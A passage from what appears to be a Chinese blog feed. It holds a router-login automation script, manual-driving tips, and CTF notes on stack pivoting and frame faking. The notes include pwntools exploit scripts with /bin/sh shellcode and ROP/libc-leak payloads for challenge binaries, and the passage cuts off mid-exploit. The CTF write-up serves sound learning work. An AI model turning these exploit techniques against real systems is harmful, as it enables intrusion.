    <content><![CDATA[<h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>最近研究了下学校校园网，本来想试试不登录的情况下宿舍和教学楼的IP能否互通，答案是不能。这个脚本本来是为了从宿舍路由器获得WANIP而写的，但既然不能互通，拿到IP也没啥用了。脚本地址：<a class="link"   href="https://github.com/Hexrotor/miRouterLogin" >miRouterLogin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>登进路由器，url是这样的：<code>http://路由器IP/cgi-bin/luci/;stok=3064506d8615d0a05cad3356af54d898/web/home</code></p>
<p>中间有串参数就是token，我的目的是要模拟网页登录拿到它</p>
<p>而获取WANIP的方式可以通过控制台轻松查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/router_pppoe_status.jpg.avif"
                     
                ></p>
<p>url是这样的：<code>http://路由器IP/cgi-bin/luci/;stok=3064506d8615d0a05cad3356af54d898/api/xqnetwork/pppoe_status</code></p>
<p>可见只要拿到token，一切都好说，为此，我们需要从登录页面入手，了解网页是如何跳转到包含token的网址的。</p>
<p>这个过程我参考了<a class="link"   href="https://blog.csdn.net/hackzkaq/article/details/119676876" >https://blog.csdn.net/hackzkaq/article/details/119676876 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>总之先在登录界面抓包，我嫌麻烦就在手机上用HttpCanary抓的</p>
<p>抓包发现了登录时会向<code>http://路由器IP/cgi-bin/luci/api/xqsystem/login</code> 这个url发送POST请求，内容是类似<code>username=admin&amp;password=0afb4d1dc7ce1c48afa11233bc055b9106ba1c8cd&amp;logtype=2&amp;nonce=0_98%3A15%3A3d%3Afb%3A3b%3Acb_1677680921_8869</code>这样的数据，其中nonce和password都是js动态生成的。</p>
<p>查找网页源代码，发现登录时调用loginHandle方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/loginhandle.jpg.avif"
                     
                ></p>
<p>源码显示加密是用了Encrypt方法，继续搜索关键词，最终发现会涉及<code>aes.js</code>和<code>sha1.js</code>两个源文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/encryptjs.jpg.avif"
                     
                ></p>
<p>捋一下逻辑就是：输入密码，由loginHandle方法调用Encrypt方法来生成nonce和加密后的password。将nonce和password POST给路由器，路由器就会返回token</p>
<p>可以直接把要用到的js代码粘到一个文件里，方便调用<br>Python脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#参考自https://blog.csdn.net/hackzkaq/article/details/119676876</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> execjs <span class="comment"># 导入PyExecJS 库</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_js</span>(): <span class="comment"># 导入js文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;login.js&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">    line = f.readline()</span><br><span class="line">    htmlstr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> line:</span><br><span class="line">        htmlstr = htmlstr + line</span><br><span class="line">        line = f.readline()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> htmlstr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>(<span class="params">ip, passwd</span>): <span class="comment"># 使用curl获取token</span></span><br><span class="line">    jsstr = get_js()</span><br><span class="line">    ctx = execjs.<span class="built_in">compile</span>(jsstr)</span><br><span class="line">    utf = ctx.call(<span class="string">&quot;tokenGen&quot;</span>, passwd)</span><br><span class="line">    <span class="comment">#print(&quot;utf: &quot; , utf)</span></span><br><span class="line">    en = urlencode(utf, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(&quot;en: &quot; + en)</span></span><br><span class="line">    cmd = <span class="string">&quot;curl -ss -X POST -H \&quot;Accept-Encoding:gzip, deflate\&quot; -H \&quot;Accept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\&quot; -H \&quot;Host:192.168.114.1\&quot; -H \&quot;Connection:keep-alive\&quot; -H \&quot;User-Agent:Mozilla/5.0 (Linux; Android 12; 22081212C Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36\&quot; -H \&quot;Content-Length:126\&quot; -H \&quot;Accept:*/*\&quot; -H \&quot;X-Requested-With:XMLHttpRequest\&quot; -H \&quot;Content-Type:application/x-www-form-urlencoded; charset=UTF-8\&quot; -H \&quot;Origin:http://&quot;</span>+ip+<span class="string">&quot;\&quot; -H \&quot;Referer:http://&quot;</span>+ip+<span class="string">&quot;/cgi-bin/luci/web\&quot; -d \&quot;&quot;</span>+en+<span class="string">&quot;\&quot; \&quot;http://&quot;</span>+ip+<span class="string">&quot;/cgi-bin/luci/api/xqsystem/login\&quot;|jq -r \&quot;.token\&quot;&quot;</span></span><br><span class="line">    <span class="comment">#print(&quot;cmd: &quot; + cmd)</span></span><br><span class="line">    apikey = os.popen(cmd).read()[:-<span class="number">1</span>] <span class="comment"># 执行curl</span></span><br><span class="line">    <span class="keyword">return</span> apikey</span><br><span class="line"></span><br><span class="line">ip = <span class="built_in">input</span>(<span class="string">&quot;Please enter the router ip: &quot;</span>)</span><br><span class="line">passwd = <span class="built_in">input</span>(<span class="string">&quot;Please enter password: &quot;</span>)</span><br><span class="line">token = get_token(ip, passwd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;token: &quot;</span> + token)</span><br><span class="line">url = <span class="string">&quot;http://&quot;</span>+ip+<span class="string">&quot;/cgi-bin/luci/;stok=&quot;</span>+token+<span class="string">&quot;/api/xqnetwork/pppoe_status&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;weburl: &quot;</span>+ url)</span><br><span class="line"><span class="comment">#print(&quot;apikey :&quot;+ apikey)</span></span><br><span class="line"><span class="built_in">print</span>(os.popen(<span class="string">&quot;curl -ss \&quot;&quot;</span>+url+<span class="string">&quot;\&quot;|jq&quot;</span>).read())</span><br></pre></td></tr></table></figure></div>

<p>执行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/router_script_stdout.jpg.avif"
                     
                ></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>手动挡驾驶经验分享</title>
    <url>/2023/05/02/manual-drive-tips/</url>
    <content><![CDATA[<p>本人刚拿驾照，在这里分享一些自己知道的手动挡驾驶技巧</p>
<h3 id="降档补油"><a href="#降档补油" class="headerlink" title="降档补油"></a>降档补油</h3><p>为什么要降档？某些时候我们需要降档来更好地利用发动机。在跑山时，为了防止刹车过热，我们可以依赖发动机来制动。正常情况下只要不给油，家用车的发动机转速一般在1k以下，所以只要发动机高于这个转速就会有制动效果。根据杠杆原理，挡位越低，发动机制动效果越明显。同样根据杠杆原理，档位越低，发动机输出给轮胎的扭矩越大，在超车时提速更快，所以超车和陡坡常常需要降档。</p>
<p>总所周知，不踩离合时，发动机转速和轮胎转速成比例，这个比例取决于挂的挡位，所以当换档时，这个比例会改变。</p>
<p>一般来说新手开车降档操作和升档一样，都是踩离合拨挡杆，但这样的话车子会抖一下。这是因为踩下离合时，发动机会与轮胎断开连接，此时如果没有给油，发动机的转速会逐渐降低。但注意我说的是降档，在相同的车速下，低档位匹配的转速应该更高，这也就解释了为什么松离合车会抖一下 —— 离合片合上瞬间发动机会给轮胎一个阻力，使得车身会抖一下，同时轮胎传动会把发动机转速拖高。</p>
<p>为了避免这种情况，我们可以在降档的时候补一脚油使得发动机转速升一点，然后快速降档。如果补油量控制得好，基本可以避免车身发抖。</p>
<p>对于不同车，油门力度的控制也不同。具体的操作大概是先轻踩油门，再踩离合降档，或者技术比较好的可以踩离合的同时补油。</p>
<h4 id="跟趾"><a href="#跟趾" class="headerlink" title="跟趾"></a>跟趾</h4><p>我还不会，以后再写</p>
<p>咕咕咕</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汽车</tag>
        <tag>日常</tag>
      </tags>
  </entry>
  <entry>
    <title>花式栈溢出</title>
    <url>/2023/04/24/stackoverflow-tips/</url>
    <content><![CDATA[<p>本文是本人跟着ctf-wiki上学之后做的笔记，写得比较详细</p>
<h3 id="栈转移"><a href="#栈转移" class="headerlink" title="栈转移"></a>栈转移</h3><p>栈转移是指劫持<code>SP</code>指针到我们能控制的位置，以便实现一些之前不方便的操作</p>
<p>一般来说需要使用该技巧的情况有：</p>
<ul>
<li>可控的栈溢出字节数较少，难以构造长 payload 进行 rop</li>
<li>有PIE地址随机化，栈地址未知。可以通过劫持转移栈到已知地址</li>
<li>其他漏洞难利用，转换后更方便，比如把栈转移到堆空间后写rop</li>
</ul>
<p>要求有：</p>
<ul>
<li>可控程序执行流</li>
<li>可控<code>SP</code>指针</li>
</ul>
<p>一般来说控制<code>SP</code>指针用<code>pop rsp/esp</code></p>
<p><code>__libc_csu_init</code>中就有这种gadgets，但要使用偏移</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">gef➤  x/7i <span class="number">0x000000000040061a</span></span><br><span class="line"><span class="number">0x40061a</span> &lt;__libc_csu_init+<span class="number">90</span>&gt;:  pop    rbx</span><br><span class="line"><span class="number">0x40061b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;:  pop    rbp</span><br><span class="line"><span class="number">0x40061c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;:  pop    r12</span><br><span class="line"><span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:  pop    r13</span><br><span class="line"><span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:  pop    r14</span><br><span class="line"><span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:  pop    r15</span><br><span class="line"><span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;: ret    </span><br><span class="line">gef➤  x/7i <span class="number">0x000000000040061d</span></span><br><span class="line"><span class="number">0x40061d</span> &lt;__libc_csu_init+<span class="number">93</span>&gt;:  pop    rsp  <span class="comment"># 原本pop r12</span></span><br><span class="line"><span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:  pop    r13</span><br><span class="line"><span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:  pop    r14</span><br><span class="line"><span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:  pop    r15</span><br><span class="line"><span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;: ret</span><br></pre></td></tr></table></figure></div>

<p>此外，还有更加高级的 fake frame，要求有一段可以控制内容的内存，一般是如下：</p>
<ul>
<li>bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。然而一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。</li>
<li>heap。但是这个需要我们能够泄露堆地址。</li>
</ul>
<h4 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w"></a>X-CTF Quals 2016 - b0verfl0w</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec: 什么都没开</span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>

<p>IDA反编译：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+18h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>); # 读<span class="number">50</span>个字符，不好构造长payload</span><br><span class="line">  <span class="title function_">printf</span><span class="params">(<span class="string">&quot;Hello %s.&quot;</span>, &amp;s)</span>;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这题的思路是在栈上填入短<code>shellcode</code>，然后想办法<code>jmp esp</code>，<code>EIP</code>就会跳到栈上。我们提前在栈上填入机器码处理<code>esp</code>，使<code>esp</code>指向<code>shellcode</code>后再次<code>jmp esp</code></p>
<p>构造的payload结构如下：</p>
<p><code>shellcode|padding|ebp|jmp_esp_addr|asm(&quot;sub esp, 0x?;jmp esp&quot;)</code></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找 jmp esp</span></span><br><span class="line">$ ROPgadget --binary b0verfl0w --only <span class="string">&quot;jmp&quot;</span>|grep esp</span><br><span class="line">0x08048504 : jmp esp</span><br></pre></td></tr></table></figure></div>

<p>执行<code>sub esp</code>时<code>ESP</code>到shellcode的距离可以通过看payload长度计算出来</p>
<p>首先<code>shellcode+padding</code>是0x20</p>
<p><code>ebp</code>0x4</p>
<p><code>jmp_esp_addr</code> 0x4</p>
<p>我们需要设置<code>esp</code>到<code>shellcode</code>，而此时<code>esp</code>在<code>jmp_esp_addr</code>的后面指向asm，所以需要对<code>esp</code> - 0x28</p>
<p>exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./b0verfl0w&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">shellcode.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 填充shellcode长度</span></span><br><span class="line">sub_esp_jmp_esp = asm(<span class="string">&quot;sub esp, 0x28;jmp esp&quot;</span>) <span class="comment">#生成机器码</span></span><br><span class="line">jmp_esp_addr = <span class="number">0x08048504</span></span><br><span class="line">payload = flat([shellcode, <span class="string">&quot;bbbb&quot;</span>, jmp_esp_addr, sub_esp_jmp_esp])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="frame-faking-栈伪造"><a href="#frame-faking-栈伪造" class="headerlink" title="frame faking(栈伪造)"></a>frame faking(栈伪造)</h3><p>构建一个虚假的栈帧来控制程序的执行流。我们需要同时控制<code>IP</code>和<code>BP</code>寄存器，这样我们就能在控制程序执行流的同时也改变栈帧的位置</p>
<p>以下内容基于x86架构</p>
<p>这种攻击方式payload的格式一般如下：<code>buffer padding|fake ebp|leave_ret_addr|</code>其中<code>fake ebp</code>为我们构造的假栈帧的基址。注意这里多了<code>leave</code>指令</p>
<p>回顾<code>leave</code>指令的等效用法：<code>mov esp, ebp; pop ebp</code> 在执行此命令之前，<code>EBP</code>指向栈中saved ebp</p>
<p>执行后，<code>EBP</code>回到主调函数位置，<code>ESP</code>指向retaddr</p>
<p>而<code>ret</code>指令实际上等效于<code>pop eip</code>，执行后<code>ESP</code>完全回到主调函数的原位置</p>
<p>上面提到的payload中，<code>retaddr</code>被覆盖为<code>leave_ret_addr</code>，这导致程序ret后会再次执行<code>leave</code> <code>ret</code></p>
<p>接下来的描述有点绕，在这里先明确一些代号：</p>
<ul>
<li><code>ebp2</code>是一个值，这个值是一个内存地址，是我们最终想赋给寄存器<code>EBP</code>的值(使<code>EBP</code>指向这个地址)</li>
<li><code>ebp2_addr</code>是一个值，这个值是一个内存地址，该处内存保存着<code>ebp2</code>的值</li>
</ul>
<p>假栈帧大致格式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+---------------------+</span><br><span class="line">| arg2 of function    | 高地址</span><br><span class="line">+---------------------+</span><br><span class="line">| arg1 of function    |</span><br><span class="line">+---------------------+</span><br><span class="line">| leave_ret_addr      |</span><br><span class="line">+---------------------+</span><br><span class="line">| target function addr|</span><br><span class="line">+---------------------+</span><br><span class="line">| ebp2                |</span><br><span class="line">+---------------------+ &lt;- ebp2_addr</span><br></pre></td></tr></table></figure></div>

<p>payload的<code>fake ebp</code> 就是 <code>ebp2_addr</code>:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">buffer padding|fake ebp|leave_ret_addr|</span><br><span class="line">buffer padding|ebp2_addr|leave_ret_addr|</span><br></pre></td></tr></table></figure></div>

<p>利用此payload，我们可以依次做以下事情：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave:</span><br><span class="line">	mov esp, ebp</span><br><span class="line">	pop ebp # 使ebp变为ebp2_addr</span><br><span class="line"></span><br><span class="line">ret # run leave ret again</span><br><span class="line"></span><br><span class="line">leave:</span><br><span class="line">	mov esp, ebp # 使esp也变为ebp2_addr，这让esp指向了ebp2_addr</span><br><span class="line">	pop ebp # 此时esp指向ebp2_addr，此操作会将该处内存的ebp2值赋给ebp</span><br><span class="line"></span><br><span class="line">ret # return to target function 需要提前在ebp2_addr+4处写入target function addr</span><br><span class="line"></span><br><span class="line"># after target function, return to leave_ret_addr</span><br><span class="line"># 然后程序又会执行类似的操作。如果我们在ebp2指向的地址处也设置好了相应内容，就能继续劫持ebp+eip</span><br><span class="line"># 当然，如果假栈帧能控制的大小足够长，我们也可以直接像以前一样构造纯粹的rop，不再借助leave ret</span><br><span class="line"># 即假栈帧的结构为:</span><br><span class="line"></span><br><span class="line">+---------------------+</span><br><span class="line">| ...                 | 高地址</span><br><span class="line">+---------------------+</span><br><span class="line">| next_retaddr        |</span><br><span class="line">+---------------------+</span><br><span class="line">| arg2                |</span><br><span class="line">+---------------------+</span><br><span class="line">| arg1                |</span><br><span class="line">+---------------------+</span><br><span class="line">| pop_xxx_pop_xxx_ret |</span><br><span class="line">+---------------------+</span><br><span class="line">| target function addr|</span><br><span class="line">+---------------------+</span><br><span class="line">| ebp2                | </span><br><span class="line">+---------------------+ &lt;- ebp2_addr</span><br></pre></td></tr></table></figure></div>


<h4 id="2018-安恒杯-over-over"><a href="#2018-安恒杯-over-over" class="headerlink" title="2018 安恒杯 over.over"></a>2018 安恒杯 over.over</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped</span><br><span class="line">[*] &#x27;/home/m4x/pwn_repo/others_over/over.over&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( sub_400676() )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400676</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">96uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个题的思路是泄露libc执行execve，但可以看出read读96字节但buf长度已经有80字节，所以只能通过覆盖saved rbp和retaddr来劫持<code>RBP</code><br>我们向buf上写入rop链，然后劫持<code>RSP</code>和<code>RBP</code>到此处，这就需要我们知道buf的地址</p>
<h5 id="leak-stack"><a href="#leak-stack" class="headerlink" title="leak stack"></a>leak stack</h5><p>我们使用<code>puts</code>函数泄露出saved rbp，然后就能根据saved rbp的值推算出栈上各个数据的地址</p>
<p>我们leak的时候靠的是运行<code>sub_400676()</code>这个函数中的puts函数，而传给puts的参数是位于<code>sub_400676</code>栈上的<code>buf</code>，<code>buf</code>挨着的是<code>sub_400676</code>栈上的saved rbp，而这个saved rbp是主调函数的，也就是<code>main</code>函数的<code>RBP</code>。我们需要计算<code>main</code>函数的<code>RBP</code>地址到<code>buf</code>的长度，<code>main</code>函数的<code>RBP</code>减去长度值即得到<code>buf</code>的地址。</p>
<p>一种简单的计算方法是调试，在<code>main</code>函数下断点看看<code>RBP</code>的值，然后运行到<code>sub_400676</code>看看<code>buf</code>的地址，直接一减就出来了。</p>
<p>另一种方法是看汇编，<code>main</code>函数中:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006C1                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006C4                 sub     rsp, 10h</span><br></pre></td></tr></table></figure></div>

<p>这使<code>RBP</code>的值固定，<code>RSP</code>减0x10，也就是说<code>main</code>函数中<code>RSP</code>到<code>RBP</code>距离为0x10</p>
<p>随后运行到<code>call sub_400676()</code>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400676                 push    rbp</span><br><span class="line">.text:0000000000400677                 mov     rbp, rsp</span><br><span class="line">.text:000000000040067A                 sub     rsp, 50h</span><br></pre></td></tr></table></figure></div>

<p>这使得<code>RSP</code>向下移动了0x8+0x8+0x50&#x3D;0x60。其中第一个0x8是<code>call</code>指令把返回地址压栈造成的</p>
<p>所以<code>RSP</code>到最初<code>main</code>函数<code>RBP</code>的距离是0x10+0x60&#x3D;0x70</p>
<p>当我们泄露出<code>main</code>函数的<code>RBP</code>，我们对其减0x70，就能得到<code>buf</code>的地址了</p>
<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><p>本地打：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&quot;./over.over&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;for debug</span></span><br><span class="line"><span class="string">def DEBUG(cmd):</span></span><br><span class="line"><span class="string">    raw_input(&quot;DEBUG: &quot;)</span></span><br><span class="line"><span class="string">    gdb.attach(io, cmd)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">libc = elf.libc <span class="comment"># 本地打，可以直接获取libc</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">80</span>)</span><br><span class="line"><span class="comment"># 不能使用sendline，因为回车会影响read的读入。如果使用sendline，那么回车&quot;\x0a&quot;会被作为数据录入，直接影响到saved rbp</span></span><br><span class="line"></span><br><span class="line">buf = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line"><span class="comment"># 这个程序本身会调用puts打印出我们输入的东西，而puts只有遇到&quot;\0&quot;才会停</span></span><br><span class="line"><span class="comment"># 我们用0x80个a把栈空间填满，于是puts就会一直打印直到遇到&quot;\0&quot;</span></span><br><span class="line"><span class="comment"># 而后面就是8字节的saved rbp，会被puts泄露出来</span></span><br><span class="line"><span class="comment"># 栈是由高地址向低地址生长，其最高字节一定是&quot;\x7f&quot;</span></span><br><span class="line"><span class="comment"># 根据小端序&quot;高高低低&quot;，&quot;\x7f&quot;在高地址也就是泄露出来的8字节的最后一个字节，故recvuntil(b&quot;\x7f&quot;)</span></span><br><span class="line"><span class="comment"># 至于这里为什么切最后6个字节，原因是x64规定内存地址不能大于 0x00007FFFFFFFFFFF</span></span><br><span class="line"><span class="comment"># 6个字节长度，否则会抛出异常。所以栈地址一定保存在最后6字节中</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;buf -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(buf))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400793</span></span><br><span class="line">leave_ret = <span class="number">0x4006be</span></span><br><span class="line"><span class="comment">#  DEBUG(&quot;b *0x4006B9\nc&quot;)</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;11111111&#x27;</span>, pop_rdi_ret, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x400676</span>, (<span class="number">80</span> - <span class="number">40</span>) * <span class="string">b&#x27;1&#x27;</span>, buf, leave_ret])</span><br><span class="line"><span class="comment"># 这个payload先倒着看，依次对应的是retaddr和saved rbp</span></span><br><span class="line"><span class="comment"># 首先pop rbp使rbp指向buf，也就是payload写进栈中的&quot;11111111&quot;那个位置</span></span><br><span class="line"><span class="comment"># 然后ret到leave_ret，执行leave使rsp也指向buf，随后pop rbp把&quot;11111111&quot;弹出，rsp指向pop_rdi_ret</span></span><br><span class="line"><span class="comment"># ret到pop_rdi_ret，把puts的got表载入rdi，再ret调用puts来泄露got表得到偏移量</span></span><br><span class="line"><span class="comment"># puts再ret回到sub_400676了</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这一步是实际地址减去偏移量得到libc基址</span></span><br><span class="line"><span class="string">libc被加载到内存中的动态链接区域，这个区域在栈的下方，所以这里也使用&quot;\x7f&quot;作为结束符接受</span></span><br><span class="line"><span class="string">对应的，对于32位程序，需要使用&quot;\xf7&quot;</span></span><br><span class="line"><span class="string">u32(r.recvuntil(&#x27;\xf7&#x27;)[-4:])</span></span><br><span class="line"><span class="string">+-------------------+  &lt;--- 高地址</span></span><br><span class="line"><span class="string">|       栈区        |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|   动态链接区域    |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|       堆区        |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|       数据区      